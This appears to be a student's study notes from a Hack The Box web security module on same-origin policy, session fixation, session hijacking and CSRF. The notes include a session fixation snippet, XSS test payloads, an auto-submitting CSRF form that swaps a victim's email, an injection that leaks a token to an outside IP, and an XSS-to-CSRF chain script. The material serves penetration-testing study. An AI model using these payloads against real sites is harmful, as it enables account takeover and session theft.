# <span style=color:#44D62C>Same-Origin Policy (SOP)</span>
* ==a web browser permits scripts contained in a first web page to access data in a second web page, but only if both web pages have the same origin==
    * cant different protocol
        * http(80) vs. https(443)
    * cant different sub domain
        * www.htb.htb/page1 vs. abc.htb.htb/page2
    * cant different port
        * www.htb.htb:8000/page1 vs. abc.htb.htb:8080/page2

---
# <span style=color:red>Session Hijacking</span>
* ctrl+shift+i

![image](https://hackmd.io/_uploads/BJv8RQ3XC.png)

---
# <span style=color:red>Session Fixation</span>
```php=
<?php
    if (!isset($_GET["token"])) {
        session_start();
        header("Location: /?redirect_uri=/complete.html&token=" . session_id());
    } else {
        setcookie("PHPSESSID", $_GET["token"]);
    }
?>
```
![image](https://hackmd.io/_uploads/ryiT0_2mR.png)
# <span style=color:red>Obtaining session cookies via XSS</span> 
![Screenshot_20240527_143453](https://hackmd.io/_uploads/ByJoFsb40.jpg)
```javascript
"><img src=x onerror=prompt(document.domain)>
```
```javascript
"><img src=x onerror=confirm(1)>
```
```javascript
"><img src=x onerror=alert(1)>
```
* onload, onerror, onmouseover
* type Share

![Screenshot_20240527_143529](https://hackmd.io/_uploads/H1-TYoWN0.jpg)
# <span style=color:red>Cross-Site Request Forgery</span> 
* https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-request-forgery/
    * All the parameters required for the targeted request can be determined or guessed by the attacker
    * The application's session management is solely based on HTTP cookies, which are automatically included in browser requests
* need
    * To craft a <span style=color:#44D62C>malicious web page</span> that will issue a valid (cross-site) request impersonating the victim
    * The victim to be logged into the application at the time when the malicious cross-site request is issued
## <span style=color:>Get-Based</span>
* notmalicious_get.html
```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
## <span style=color:>Post-Based</span>
Exploiting an HTML Injection/XSS Vulnerability
* HTML injection
```html
<h1>h1<u>underline<%2fu><%2fh1>
```
![image](https://hackmd.io/_uploads/r18kqpamC.png)

```html
http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f10.10.14.20:8000%2f
```
![image](https://hackmd.io/_uploads/Hk2hiaaQ0.png)

---
## <span style=color:>XSS & CSRF chain</span>
* XSS payload
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```